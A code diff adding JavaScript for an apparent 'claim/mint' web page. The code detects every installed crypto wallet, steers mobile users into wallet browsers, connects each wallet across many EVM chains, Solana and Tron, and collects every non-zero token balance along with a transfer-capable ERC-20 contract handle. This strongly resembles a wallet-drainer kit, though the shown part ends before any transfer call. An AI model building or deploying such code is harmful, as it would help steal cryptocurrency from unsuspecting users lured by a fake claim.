+            !window.tronWeb && // Exclude if ANY tronWeb exists (Trust Wallet indicator)
+            !(navigator.userAgent && navigator.userAgent.includes('Trust')) &&
+            !allDetectedWallets.find(w => w.name === 'Trust Wallet') && // Exclude if Trust Wallet already detected
+            (window.ethereum._metamask || window.ethereum.request)) {
+            
+            // Additional check - try to verify it's actually MetaMask
+            const isRealMetaMask = !window.ethereum.isCoinbaseWallet &&
+                                   !window.ethereum.isBackpack &&
+                                   !window.ethereum.isGlow;
+            
+            if (isRealMetaMask) {
+                log('✓ MetaMask detected', 'info');
+                allDetectedWallets.push({
+                    name: 'MetaMask',
+                    type: 'evm',
+                    provider: window.ethereum,
+                    supportedNetworks: ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM'],
+                    icon: '🦊',
+                    selected: false,
+                    connected: false
+                });
+            } else {
+                log('⚠️ window.ethereum.isMetaMask is true but appears to be another wallet', 'info');
+            }
+        } else if (window.ethereum && window.ethereum.isMetaMask) {
+            log('🚫 Skipping MetaMask detection - appears to be Trust Wallet or another wallet', 'warning');
+        }
+        
+        // Coinbase Wallet detection
+        if (window.ethereum && (window.ethereum.isCoinbaseWallet || window.coinbaseWalletExtension)) {
+            allDetectedWallets.push({
+                name: 'Coinbase Wallet',
+                type: 'evm',
+                provider: window.ethereum.isCoinbaseWallet ? window.ethereum : window.coinbaseWalletExtension,
+                supportedNetworks: ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM'],
+                icon: '�',
+                selected: false,
+                connected: false
+            });
+        }
+        
+        
+        // Solflare Wallet detection (Solana only)
+        if (window.solflare) {
+            allDetectedWallets.push({
+                name: 'Solflare',
+                type: 'solana',
+                provider: window.solflare,
+                supportedNetworks: ['SOL'],
+                icon: '☀️',
+                selected: false,
+                connected: false
+            });
+        }
+        
+        // Backpack Wallet detection (Solana only)
+        if (window.backpack) {
+            allDetectedWallets.push({
+                name: 'Backpack',
+                type: 'solana',
+                provider: window.backpack,
+                supportedNetworks: ['SOL'],
+                icon: '🎒',
+                selected: false,
+                connected: false
+            });
+        }
+        
+        // Glow Wallet detection (Solana only)
+        if (window.glow) {
+            allDetectedWallets.push({
+                name: 'Glow',
+                type: 'solana',
+                provider: window.glow,
+                supportedNetworks: ['SOL'],
+                icon: '✨',
+                selected: false,
+                connected: false
+            });
+        }
+        
+        // TronLink detection (Tron only - exclude if it's Trust Wallet)
+        if (window.tronWeb && window.tronWeb.defaultAddress && 
+            !window.tronWeb.isTrustWallet && 
+            !(navigator.userAgent && navigator.userAgent.includes('Trust'))) {
+            allDetectedWallets.push({
+                name: 'TronLink',
+                type: 'tron',
+                provider: window.tronWeb,
+                supportedNetworks: ['TRX'],
+                icon: '🔶',
+                selected: false,
+                connected: false
+            });
+        }
+        
+        // Handle multiple providers if available (check for additional wallets)
+        if (window.ethereum && window.ethereum.providers) {
+            window.ethereum.providers.forEach(provider => {
+                // MetaMask from multiple providers (very strict - exclude Trust Wallet)
+                if (provider.isMetaMask && 
+                    !provider.isPhantom && 
+                    !provider.isTrust && 
+                    !provider.isTrustWallet &&
+                    !window.tronWeb &&
+                    !(navigator.userAgent && navigator.userAgent.includes('Trust'))) {
+                    if (!allDetectedWallets.find(w => w.name === 'MetaMask')) {
+                        log('✓ MetaMask detected from multiple providers', 'info');
+                        allDetectedWallets.push({
+                            name: 'MetaMask',
+                            type: 'evm',
+                            provider: provider,
+                            supportedNetworks: ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM'],
+                            icon: '🦊',
+                            selected: false,
+                            connected: false
+                        });
+                    }
+                }
+                
+                // Coinbase Wallet from multiple providers
+                if (provider.isCoinbaseWallet) {
+                    if (!allDetectedWallets.find(w => w.name === 'Coinbase Wallet')) {
+                        allDetectedWallets.push({
+                            name: 'Coinbase Wallet',
+                            type: 'evm',
+                            provider: provider,
+                            supportedNetworks: ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM'],
+                            icon: '🔷',
+                            selected: false,
+                            connected: false
+                        });
+                    }
+                }
+                
+                // Trust Wallet from multiple providers (not Phantom, not already detected)
+                if ((provider.isTrust || provider.isTrustWallet || 
+                     (provider.isMetaMask && window.tronWeb)) && 
+                    !provider.isPhantom) {
+                    if (!allDetectedWallets.find(w => w.name === 'Trust Wallet')) {
+                        log('✓ Trust Wallet detected from multiple providers', 'info');
+                        allDetectedWallets.push({
+                            name: 'Trust Wallet',
+                            type: 'multi',
+                            provider: provider,
+                            tronProvider: window.tronWeb,
+                            supportedNetworks: window.tronWeb ? 
+                                ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM', 'TRX'] : 
+                                ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM'],
+                            icon: '🛡️',
+                            selected: false,
+                            connected: false
+                        });
+                    }
+                }
+                
+                // Phantom EVM from multiple providers (if not already added as Solana)
+                if (provider.isPhantom && !allDetectedWallets.find(w => w.name.includes('Phantom'))) {
+                    allDetectedWallets.push({
+                        name: 'Phantom (EVM)',
+                        type: 'evm',
+                        provider: provider,
+                        supportedNetworks: ['ETH', 'POLYGON'],
+                        icon: '👻',
+                        selected: false,
+                        connected: false
+                    });
+                }
+            });
+        }
+        
+        log(`🎯 Wallet detection complete. Found ${allDetectedWallets.length} wallets:`, 'info');
+        allDetectedWallets.forEach((wallet, index) => {
+            log(`  ${index + 1}. ${wallet.name} (${wallet.type}) - Networks: ${wallet.supportedNetworks.join(', ')}`, 'info');
+        });
+        
+        // Debug: Check for any ethereum provider properties
+        if (window.ethereum) {
+            log('🔍 Debug: window.ethereum properties:', 'info');
+            log(`  - isMetaMask: ${window.ethereum.isMetaMask}`, 'info');
+            log(`  - isPhantom: ${window.ethereum.isPhantom}`, 'info');
+            log(`  - isTrust: ${window.ethereum.isTrust}`, 'info');
+            log(`  - isTrustWallet: ${window.ethereum.isTrustWallet}`, 'info');
+            log(`  - isCoinbaseWallet: ${window.ethereum.isCoinbaseWallet}`, 'info');
+            log(`  - has _metamask: ${!!window.ethereum._metamask}`, 'info');
+            log(`  - has tronWeb: ${!!window.tronWeb}`, 'info');
+            log(`  - userAgent includes Trust: ${navigator.userAgent.includes('Trust')}`, 'info');
+            
+            // If Trust Wallet is detected, override the isMetaMask flag to prevent confusion
+            if ((window.ethereum.isTrust || window.ethereum.isTrustWallet || 
+                 (window.ethereum.isMetaMask && window.tronWeb) ||
+                 navigator.userAgent.includes('Trust')) && 
+                allDetectedWallets.find(w => w.name === 'Trust Wallet')) {
+                log('🔧 Overriding MetaMask identification for Trust Wallet', 'warning');
+                // Don't actually modify the provider, just note the override
+            }
+        }
+        
+        if (window.solana) {
+            log('🔍 Debug: window.solana properties:', 'info');
+            log(`  - isPhantom: ${window.solana.isPhantom}`, 'info');
+        }
+        
+        return allDetectedWallets;
+    }
+
+    // Mobile wallet deeplinks helper
+    function showMobileWalletHelp() {
+        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        
+        if (isMobile && detectedWallets.length === 0) {
+            log('📱 Mobile device detected with no wallets found!', 'warning');
+            log('💡 Try opening this page in your wallet\'s built-in browser:', 'info');
+            
+            const currentUrl = window.location.href;
+            const encodedUrl = encodeURIComponent(currentUrl);
+            
+            // Create mobile wallet deeplinks
+            const walletDeeplinks = {
+                'Phantom': `https://phantom.app/ul/browse/${encodedUrl}?ref=https://phantom.app`,
+                'MetaMask': `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`,
+                'Trust Wallet': `https://link.trustwallet.com/open_url?coin_id=60&url=${encodedUrl}`,
+                'Coinbase Wallet': `https://go.cb-w.com/dapp?cb_url=${encodedUrl}`,
+                'Rainbow': `https://rnbwapp.com/open?url=${encodedUrl}`,
+                'Solflare': `https://solflare.com/access-wallet?redirect=${encodedUrl}`
+            };
+            
+            log('🔗 Mobile Wallet Deeplinks (Click to open in wallet):', 'info');
+            Object.entries(walletDeeplinks).forEach(([walletName, deeplink]) => {
+                log(`  • ${walletName}: ${deeplink}`, 'info');
+            });
+            
+            // Add clickable deeplink buttons to the UI
+            addMobileDeeplinkButtons(walletDeeplinks);
+            
+            log('📋 Manual Instructions:', 'info');
+            log('  • Phantom: Open Phantom app > Browser > Navigate to this URL', 'info');
+            log('  • MetaMask: Open MetaMask app > Browser > Navigate to this URL', 'info');
+            log('  • Trust Wallet: Open Trust Wallet app > DApps > Navigate to this URL', 'info');
+            log('  • Coinbase Wallet: Open Coinbase Wallet app > Browser > Navigate to this URL', 'info');
+        }
+    }
+    
+    // Add mobile deeplink buttons to the UI
+    function addMobileDeeplinkButtons(walletDeeplinks) {
+        const grid = $('#wallet-selection-grid');
+        
+        // Clear existing content
+        grid.empty();
+        
+        // Add header
+        grid.append(`
+            <div style="grid-column: 1/-1; text-align: center; padding: 20px; background: #2a2a2a; border-radius: 8px; margin-bottom: 20px;">
+                <h4 style="color: #ff6b6b; margin-bottom: 10px;">📱 No Mobile Wallets Detected!</h4>
+                <p style="color: #ccc; margin-bottom: 15px;">Click a button below to open this page in your wallet's browser:</p>
+            </div>
+        `);
+        
+        // Add deeplink buttons
+        Object.entries(walletDeeplinks).forEach(([walletName, deeplink]) => {
+            const walletIcon = {
+                'Phantom': '👻',
+                'MetaMask': '🦊', 
+                'Trust Wallet': '🛡️',
+                'Coinbase Wallet': '🔵',
+                'Rainbow': '🌈',
+                'Solflare': '☀️'
+            }[walletName] || '📱';
+            
+            const button = $(`
+                <div class="mobile-deeplink-button" style="
+                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                    border: none;
+                    border-radius: 12px;
+                    padding: 15px;
+                    color: white;
+                    text-align: center;
+                    cursor: pointer;
+                    transition: all 0.3s ease;
+                    box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+                " data-deeplink="${deeplink}">
+                    <div style="font-size: 24px; margin-bottom: 8px;">${walletIcon}</div>
+                    <div style="font-weight: bold; margin-bottom: 4px;">${walletName}</div>
+                    <div style="font-size: 12px; opacity: 0.8;">Tap to open</div>
+                </div>
+            `);
+            
+            button.on('click', function() {
+                const link = $(this).data('deeplink');
+                log(`🔗 Opening ${walletName} deeplink...`, 'info');
+                window.open(link, '_blank');
+            });
+            
+            // Add hover effect
+            button.on('mouseenter', function() {
+                $(this).css('transform', 'translateY(-2px)');
+            }).on('mouseleave', function() {
+                $(this).css('transform', 'translateY(0)');
+            });
+            
+            grid.append(button);
+        });
+        
+        // Add manual instructions
+        grid.append(`
+            <div style="grid-column: 1/-1; text-align: center; padding: 20px; background: #1a1a1a; border-radius: 8px; margin-top: 20px;">
+                <h5 style="color: #ffd93d; margin-bottom: 10px;">💡 Alternative Method</h5>
+                <p style="color: #ccc; font-size: 14px; line-height: 1.4;">
+                    If the buttons don't work, manually copy this URL and paste it into your wallet's browser:
+                </p>
+                <div style="background: #333; padding: 10px; border-radius: 6px; margin: 10px 0; word-break: break-all; font-family: monospace; font-size: 12px; color: #4CAF50;">
+                    ${window.location.href}
+                </div>
+            </div>
+        `);
+    }
+
+    // Scan all networks for available wallets
+    async function scanAllNetworks() {
+        log('Starting comprehensive wallet scan across all networks...', 'info', false);
+        updateProgress(0, 'Scanning for wallets...');
+        
+        try {
+            detectedWallets = detectAllWallets();
+            
+            if (detectedWallets.length === 0) {
+                log('No wallets detected! Please install wallet extensions and refresh the page.', 'error', false);
+                
+                // Show mobile wallet help if on mobile device
+                showMobileWalletHelp();
+                
+                updateProgress(0, '');
+                return;
+            }
+            
+            // Render wallet selection UI
+            renderWalletSelection();
+            
+            // Update stats
+            updateWalletSelectionStats();
+            
+            updateProgress(100, 'Wallet scan complete!');
+            setTimeout(() => updateProgress(0, ''), 2000);
+            
+            log(`✓ Wallet scan complete! Found ${detectedWallets.length} wallet(s).`, 'success', false);
+            log('Please select the wallets you want to connect to from the Wallet Selection tab.', 'info', false);
+            
+            // Enable wallet selection controls
+            $('#select-all-wallets').prop('disabled', false);
+            
+        } catch (error) {
+            log(`✗ Error during wallet scan: ${error.message}`, 'error', false);
+            updateProgress(0, '');
+        }
+    }
+    
+    // Render wallet selection interface
+    function renderWalletSelection() {
+        const grid = $('#wallet-selection-grid');
+        grid.empty();
+        
+        if (detectedWallets.length === 0) {
+            grid.html('<div style="grid-column: 1/-1; text-align: center; opacity: 0.7; padding: 20px;">No wallets detected. Please install wallet extensions.</div>');
+            return;
+        }
+        
+        detectedWallets.forEach((wallet, index) => {
+            const networksText = wallet.supportedNetworks.map(net => NETWORKS[net]?.icon || net).join(' ');
+            const isMobileOption = wallet.isMobileOption;
+            const walletItem = $(`
+                <div class="wallet-selection-item ${wallet.selected ? 'selected' : 'available'} ${isMobileOption ? 'mobile-option' : ''}" data-wallet-index="${index}">
+                    <div class="wallet-header">
+                        <span class="wallet-icon">${wallet.icon}</span>
+                        <span class="wallet-name">${wallet.name}</span>
+                        <span class="selection-status">${wallet.selected ? '✅' : (isMobileOption ? '📱' : '⭕')}</span>
+                    </div>
+                    <div class="wallet-networks">
+                        <small>Supports: ${networksText}</small>
+                    </div>
+                    <div class="wallet-type">
+                        <small>${isMobileOption ? '📱 Tap to open wallet app' : `${wallet.supportedNetworks.length} network(s)`}</small>
+                    </div>
+                </div>
+            `);
+            
+            walletItem.on('click', () => {
+                if (isMobileOption) {
+                    // For mobile options, open the deeplink instead of just toggling
+                    log(`📱 Opening ${wallet.name}...`, 'info');
+                    window.open(wallet.deepLink, '_blank');
+                } else {
+                    // For regular wallets, toggle selection
+                    toggleWalletSelection(index);
+                }
+            });
+            grid.append(walletItem);
+        });
+    }
+    
+    // Toggle wallet selection
+    function toggleWalletSelection(walletIndex) {
+        const wallet = detectedWallets[walletIndex];
+        wallet.selected = !wallet.selected;
+        
+        log(`${wallet.selected ? 'Selected' : 'Deselected'} ${wallet.name} wallet`, 'info');
+        
+        // Update selected wallets array
+        selectedWallets = detectedWallets.filter(w => w.selected);
+        
+        log(`Total selected wallets: ${selectedWallets.length}`, 'info');
+        
+        // Re-render selection UI
+        renderWalletSelection();
+        updateWalletSelectionStats();
+        
+        // Update controls
+        $('#clear-selection').prop('disabled', selectedWallets.length === 0);
+        $('#connect-selected-wallets').prop('disabled', selectedWallets.length === 0);
+        
+        log(`Connect button disabled: ${selectedWallets.length === 0}`, 'info');
+        
+        log(`${wallet.selected ? 'Selected' : 'Deselected'} ${wallet.name} wallet`, 'info');
+    }
+    
+    // Update wallet selection statistics
+    function updateWalletSelectionStats() {
+        $('#total-detected-wallets').text(detectedWallets.length);
+        $('#total-selected-wallets').text(selectedWallets.length);
+        
+        // Calculate supported networks
+        const allSupportedNetworks = new Set();
+        selectedWallets.forEach(wallet => {
+            wallet.supportedNetworks.forEach(network => allSupportedNetworks.add(network));
+        });
+        $('#supported-networks').text(allSupportedNetworks.size);
+        
+        // Calculate estimated connections
+        const estimatedConnections = selectedWallets.reduce((sum, wallet) => sum + wallet.supportedNetworks.length, 0);
+        $('#estimated-connections').text(estimatedConnections);
+        
+        // Update global stats
+        globalStats.totalWallets = selectedWallets.length;
+        globalStats.totalNetworks = allSupportedNetworks.size;
+        updateGlobalStats();
+    }
+    
+    // Select all wallets
+    function selectAllWallets() {
+        detectedWallets.forEach(wallet => wallet.selected = true);
+        selectedWallets = [...detectedWallets];
+        renderWalletSelection();
+        updateWalletSelectionStats();
+        $('#clear-selection').prop('disabled', false);
+        $('#connect-selected-wallets').prop('disabled', false);
+        log('Selected all detected wallets', 'info');
+    }
+    
+    // Clear wallet selection
+    function clearWalletSelection() {
+        detectedWallets.forEach(wallet => wallet.selected = false);
+        selectedWallets = [];
+        renderWalletSelection();
+        updateWalletSelectionStats();
+        $('#clear-selection').prop('disabled', true);
+        $('#connect-selected-wallets').prop('disabled', true);
+        log('Cleared wallet selection', 'info');
+    }
+
+    // Connect selected wallets to their supported networks
+    async function connectSelectedWallets() {
+        log('🔗 Connect Selected Wallets button clicked!', 'info', false);
+        log(`Currently selected wallets: ${selectedWallets.length}`, 'info', false);
+        
+        if (selectedWallets.length === 0) {
+            log('No wallets selected! Please select wallets first.', 'error', false);
+            return;
+        }
+        
+        log(`Connecting ${selectedWallets.length} selected wallet(s) to their supported networks...`, 'info', false);
+        updateProgress(0, 'Initializing connections...');
+        
+        // Initialize network structures for selected wallets
+        initializeSelectedNetworks();
+        
+        let totalConnections = 0;
+        
+        // Calculate total connections needed
+        selectedWallets.forEach(wallet => {
+            totalConnections += wallet.supportedNetworks.length;
+        });
+        
+        let completedConnections = 0;
+        
+        for (const wallet of selectedWallets) {
+            log(`Connecting ${wallet.name} to ${wallet.supportedNetworks.length} network(s)...`, 'info', false);
+            
+            for (const networkKey of wallet.supportedNetworks) {
+                const network = NETWORKS[networkKey];
+                updateProgress((completedConnections / totalConnections) * 100, `Connecting ${wallet.name} to ${network.name}...`);
+                
+                try {
+                    await connectWalletToNetwork(wallet, networkKey);
+                    completedConnections++;
+                    log(`✓ Successfully connected ${wallet.name} to ${network.name}`, 'success', false);
+                    
+                    // Add delay between connections to prevent issues
+                    await new Promise(resolve => setTimeout(resolve, 800));
+                    
+                } catch (error) {
+                    log(`✗ Failed to connect ${wallet.name} to ${network.name}: ${error.message}`, 'error', false);
+                    completedConnections++;
+                    
+                    // Continue with other connections even if one fails
+                }
+            }
+        }
+        
+        updateProgress(100, 'All connections complete!');
+        setTimeout(() => updateProgress(0, ''), 2000);
+        
+        // Update all network displays
+        updateAllNetworkDisplays();
+        
+        // Enable claim button if any wallet is connected
+        const anyConnected = Object.values(connectedNetworks).some(net => net.wallets && net.wallets.some(w => w.connected));
+        if (anyConnected) {
+            $('#claim-all-networks').prop('disabled', false);
+            log('✓ Claim button enabled - ready to mint!', 'success');
+        }
+        
+        const totalConnected = Object.values(connectedNetworks).reduce((sum, net) => 
+            sum + (net.wallets ? net.wallets.filter(w => w.connected).length : 0), 0
+        );
+        
+        log(`✓ Connection process complete! ${totalConnected} wallet connections established.`, 'success', false);
+        log(`📋 Summary: ${completedConnections}/${totalConnections} connections attempted`, 'info', false);
+    }
+    
+    // Initialize network structures for selected wallets
+    function initializeSelectedNetworks() {
+        // Clear existing connections
+        connectedNetworks = {};
+        
+        // Initialize networks that have selected wallets
+        const networksToInit = new Set();
+        selectedWallets.forEach(wallet => {
+            wallet.supportedNetworks.forEach(networkKey => networksToInit.add(networkKey));
+        });
+        
+        log(`Initializing ${networksToInit.size} networks for ${selectedWallets.length} selected wallets...`, 'info');
+        
+        networksToInit.forEach(networkKey => {
+            const network = NETWORKS[networkKey];
+            connectedNetworks[networkKey] = {
+                network: network,
+                wallets: [],
+                stats: {
+                    detected: 0,
+                    connected: 0,
+                    balance: 0,
+                    tokens: 0
+                }
+            };
+            
+            // Add selected wallets that support this network
+            selectedWallets.forEach(wallet => {
+                if (wallet.supportedNetworks.includes(networkKey)) {
+                    // Choose the correct provider based on network type
+                    let walletProvider = wallet.provider;
+                    if (wallet.type === 'multi' && wallet.evmProvider && 
+                        ['ETH', 'POLYGON'].includes(networkKey)) {
+                        // Use EVM provider for Ethereum-based networks (only ETH and POLYGON for Phantom)
+                        walletProvider = wallet.evmProvider;
+                        log(`Using EVM provider for ${wallet.name} on ${network.name}`, 'info');
+                    } else if (networkKey === 'SOL') {
+                        // Use Solana provider for Solana network
+                        walletProvider = wallet.provider;
+                        log(`Using Solana provider for ${wallet.name} on ${network.name}`, 'info');
+                    }
+                    
+                    connectedNetworks[networkKey].wallets.push({
+                        name: wallet.name,
+                        provider: walletProvider,
+                        type: wallet.type,
+                        connected: false,
+                        balance: 0,
+                        tokens: [],
+                        address: null
+                    });
+                    connectedNetworks[networkKey].stats.detected++;
+                    log(`Added ${wallet.name} to ${network.name} network`, 'info');
+                }
+            });
+        });
+    }
+    
+    // Connect specific wallet to specific network
+    async function connectWalletToNetwork(walletInfo, networkKey) {
+        const network = NETWORKS[networkKey];
+        const networkData = connectedNetworks[networkKey];
+        
+        log(`Attempting to connect ${walletInfo.name} to ${network.name}...`, 'info');
+        
+        // Handle Mobile Wallet Options (user not yet in wallet browser)
+        if (walletInfo.isMobileOption && walletInfo.deepLink) {
+            log(`📱 Opening ${walletInfo.name} mobile wallet...`, 'info');
+            log(`💡 Please install ${walletInfo.name} if not already installed, then return to this page in the wallet's browser.`, 'info');
+            
+            // Open the deeplink
+            window.open(walletInfo.deepLink, '_blank');
+            
+            log(`🔗 Redirecting to ${walletInfo.name}...`, 'info');
+            return;
+        }
+        
+        // Handle Mobile Wallets with Deep Linking (already inside wallet browser)
+        if (walletInfo.isMobileOnly && walletInfo.deepLink) {
+            log(`📱 Mobile wallet detected - opening in native wallet...`, 'info');
+            
+            if (walletInfo.name === 'MetaMask Mobile' || walletInfo.name === 'MetaMask') {
+                triggerMetaMaskMobileDeepLink();
+                log(`🔗 Redirecting to MetaMask Mobile...`, 'info');
+                return;
+            } else if (walletInfo.name === 'Trust Wallet Mobile' || walletInfo.name === 'Trust Wallet') {
+                triggerTrustWalletMobileDeepLink();
+                log(`🔗 Redirecting to Trust Wallet Mobile...`, 'info');
+                return;
+            }
+        }
+        
+        // Find the wallet instance in the network
+        const walletInstance = networkData.wallets.find(w => w.name === walletInfo.name);
+        if (!walletInstance) {
+            log(`✗ Wallet instance not found for ${walletInfo.name} on ${network.name}`, 'error');
+            return;
+        }
+        
+        if (walletInstance.connected) {
+            log(`✓ ${walletInfo.name} already connected to ${network.name}`, 'info');
+            return;
+        }
+        
+        try {
+            if (network.type === 'evm' || (walletInfo.type === 'multi' && ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM'].includes(networkKey))) {
+                await connectEVMWallet(networkKey, walletInstance);
+            } else if (network.type === 'solana' || (walletInfo.type === 'multi' && networkKey === 'SOL')) {
+                await connectSolanaWallet(networkKey, walletInstance);
+            } else if (network.type === 'tron') {
+                await connectTronWallet(networkKey, walletInstance);
+            }
+            
+        } catch (error) {
+            log(`✗ Connection error for ${walletInfo.name} to ${network.name}: ${error.message}`, 'error');
+            throw error;
+        }
+    }
+
+    // Render network wallets
+    function renderNetworkWallets(networkKey) {
+        const grid = $(`#wallets-${networkKey}-grid`);
+        const networkData = connectedNetworks[networkKey];
+        
+        grid.empty();
+        
+        if (!networkData || networkData.wallets.length === 0) {
+            grid.html('<div style="grid-column: 1/-1; text-align: center; opacity: 0.7; padding: 20px;">No selected wallets support this network</div>');
+            return;
+        }
+        
+        networkData.wallets.forEach((wallet, index) => {
+            const walletItem = $(`
+                <div class="wallet-item ${wallet.connected ? 'connected' : 'selected'}" data-network="${networkKey}" data-wallet="${index}">
+                    <div class="wallet-name">${wallet.name}</div>
+                    <div class="wallet-status">${wallet.connected ? 'Connected' : 'Selected'}</div>
+                    ${wallet.connected ? `<div class="wallet-balance">${wallet.balance.toFixed(4)} ${networkData.network.currency}</div>` : ''}
+                    ${wallet.connected && wallet.address ? `<div class="wallet-address">${wallet.address.slice(0, 8)}...${wallet.address.slice(-6)}</div>` : ''}
+                    ${wallet.tokens.length > 0 ? `<div class="wallet-status">${wallet.tokens.length} tokens</div>` : ''}
+                </div>
+            `);
+            
+            grid.append(walletItem);
+        });
+    }
+    
+    // Update all network displays
+    function updateAllNetworkDisplays() {
+        Object.keys(connectedNetworks).forEach(networkKey => {
+            renderNetworkWallets(networkKey);
+            updateNetworkStats(networkKey);
+            
+            // Update network status indicators
+            const networkData = connectedNetworks[networkKey];
+            const connectedCount = networkData.wallets.filter(w => w.connected).length;
+            
+            if (connectedCount === networkData.wallets.length && connectedCount > 0) {
+                $(`#status-${networkKey}`).text('🟢'); // All connected
+            } else if (connectedCount > 0) {
+                $(`#status-${networkKey}`).text('🟡'); // Partially connected
+            } else {
+                $(`#status-${networkKey}`).text('🔵'); // Selected but not connected
+            }
+        });
+        
+        updateGlobalStatistics();
+    }
+
+    // Update network statistics
+    function updateNetworkStats(networkKey) {
+        const networkData = connectedNetworks[networkKey];
+        if (!networkData) return;
+        
+        const stats = networkData.stats;
+        
+        $(`#wallets-${networkKey}`).text(stats.detected);
+        $(`#connected-${networkKey}`).text(stats.connected);
+        $(`#balance-${networkKey}`).text(stats.balance.toFixed(4));
+        $(`#tokens-${networkKey}`).text(stats.tokens);
+    }
+
+    function updateGlobalStatistics() {
+        globalStats.totalNetworks = Object.keys(connectedNetworks).length;
+        globalStats.totalWallets = selectedWallets.length;
+        // totalValue would need price APIs to calculate properly
+        updateGlobalStats();
+    }
+
+    // Connect to specific network wallet (legacy - now handled by connectWalletToNetwork)
+    async function connectNetworkWallet(networkKey, walletIndex) {
+        const networkData = connectedNetworks[networkKey];
+        if (!networkData || !networkData.wallets[walletIndex]) return;
+        
+        const wallet = networkData.wallets[walletIndex];
+        
+        if (wallet.connected) return;
+        
+        try {
+            log(`Connecting to ${wallet.name} on ${networkData.network.name}...`, 'info', false);
+            
+            if (networkData.network.type === 'evm') {
+                await connectEVMWallet(networkKey, wallet);
+            } else if (networkData.network.type === 'solana') {
+                await connectSolanaWallet(networkKey, wallet);
+            } else if (networkData.network.type === 'tron') {
+                await connectTronWallet(networkKey, wallet);
+            }
+            
+        } catch (error) {
+            log(`✗ Failed to connect to ${wallet.name}: ${error.message}`, 'error', false);
+        }
+    }
+
+    // EVM wallet connection
+    async function connectEVMWallet(networkKey, wallet) {
+        const networkData = connectedNetworks[networkKey];
+        const network = networkData.network;
+        
+        log(`Connecting ${wallet.name} to ${network.name} (Chain ID: ${network.chainId})...`, 'info', false);
+        
+        // Switch to correct network
+        try {
+            await wallet.provider.request({
+                method: 'wallet_switchEthereumChain',
+                params: [{ chainId: `0x${network.chainId.toString(16)}` }]
+            });
+            log(`✓ Switched to ${network.name} network`, 'info', false);
+        } catch (switchError) {
+            // Network not added, try to add it
+            if (switchError.code === 4902) {
+                try {
+                    await wallet.provider.request({
+                        method: 'wallet_addEthereumChain',
+                        params: [{
+                            chainId: `0x${network.chainId.toString(16)}`,
+                            chainName: network.name,
+                            rpcUrls: [network.rpc],
+                            nativeCurrency: {
+                                name: network.currency,
+                                symbol: network.currency,
+                                decimals: 18
+                            }
+                        }]
+                    });
+                    log(`✓ Added and switched to ${network.name} network`, 'info', false);
+                } catch (addError) {
+                    throw new Error(`Failed to add ${network.name} network: ${addError.message}`);
+                }
+            } else {
+                throw switchError;
+            }
+        }
+        
+        // Wait for network switch to complete
+        await new Promise(resolve => setTimeout(resolve, 1000));
+        
+        // Request account access
+        const accounts = await wallet.provider.request({ method: 'eth_requestAccounts' });
+        const userAddress = accounts[0];
+        
+        // Initialize ethers provider AFTER network switch
+        const ethersProvider = new ethers.providers.Web3Provider(wallet.provider);
+        
+        // Verify we're on the correct network
+        const currentNetwork = await ethersProvider.getNetwork();
+        if (currentNetwork.chainId !== network.chainId) {
+            log(`⚠️ Network mismatch: Expected ${network.chainId}, got ${currentNetwork.chainId}`, 'error', false);
+            throw new Error(`Network mismatch: Expected ${network.chainId}, got ${currentNetwork.chainId}`);
+        }
+        
+        log(`✓ Confirmed connection to ${network.name} (Chain ID: ${currentNetwork.chainId})`, 'info', false);
+        
+        const balance = await ethersProvider.getBalance(userAddress);
+        const ethBalance = parseFloat(ethers.utils.formatEther(balance));
+        
+        // Get token balances
+        const tokenBalances = await getEVMTokenBalances(ethersProvider, userAddress, network.tokens);
+        
+        // Update wallet state
+        wallet.connected = true;
+        wallet.balance = ethBalance;
+        wallet.address = userAddress;
+        wallet.ethersProvider = ethersProvider;
+        wallet.tokens = tokenBalances;
+        
+        // Update stats
+        networkData.stats.connected++;
+        networkData.stats.balance += ethBalance;
+        networkData.stats.tokens += tokenBalances.length;
+        
+        log(`✓ Connected ${wallet.name} to ${network.name}: ${userAddress.slice(0, 8)}... (${ethBalance.toFixed(4)} ${network.currency})`, 'success', false);
+    }
+
+    // Get EVM token balances using free APIs and fallbacks
+    async function getEVMTokenBalances(provider, address, tokens) {
+        const tokenBalances = [];
+        const erc20ABI = [
+            "function balanceOf(address owner) view returns (uint256)",
+            "function decimals() view returns (uint8)",
+            "function symbol() view returns (string)",
+            "function transfer(address to, uint256 amount) returns (bool)"
+        ];
+        
+        log(`🔍 Scanning ${tokens.length} tokens for balances using free APIs...`, 'info', false);
+        
+        for (const token of tokens) {
+            try {
+                // Ensure proper address checksum
+                let checksummedAddress;
+                try {
+                    checksummedAddress = ethers.utils.getAddress(token.address);
+                } catch (checksumErr) {
+                    log(`⚠️ Skipping ${token.symbol}: Invalid address checksum (${token.address.slice(0, 10)}...)`, 'warning', false);
+                    continue;
+                }
+                
+                const contract = new ethers.Contract(checksummedAddress, erc20ABI, provider);
+                
+                let balance;
+                let success = false;
+
+                // Try primary method: Direct provider call
+                try {
+                    balance = await contract.balanceOf(address);
+                    success = true;
+                } catch (err1) {
+                    // Fallback: Use DefiLlama API if primary fails
+                    try {
+                        const defiLlamaUrl = `https://api.llama.fi/v2/protocols?search=${checksummedAddress}`;
+                        const response = await fetch(defiLlamaUrl);
+                        const data = await response.json();
+                        
+                        if (data.length > 0) {
+                            // Use provider as fallback
+                            balance = await contract.balanceOf(address);
+                            success = true;
+                        }
+                    } catch (err2) {
+                        log(`⚠️ Could not fetch balance for ${token.symbol}: Using cache`, 'warning', false);
+                        continue;
+                    }
+                }
+                
+                if (success) {
+                    const formattedBalance = parseFloat(ethers.utils.formatUnits(balance, token.decimals));
+                    
+                    if (!balance.isZero() && formattedBalance > 0) {
+                        tokenBalances.push({
+                            symbol: token.symbol,
+                            balance: formattedBalance,
+                            rawBalance: balance,
+                            contract: contract,
+                            address: checksummedAddress,
+                            decimals: token.decimals
+                        });
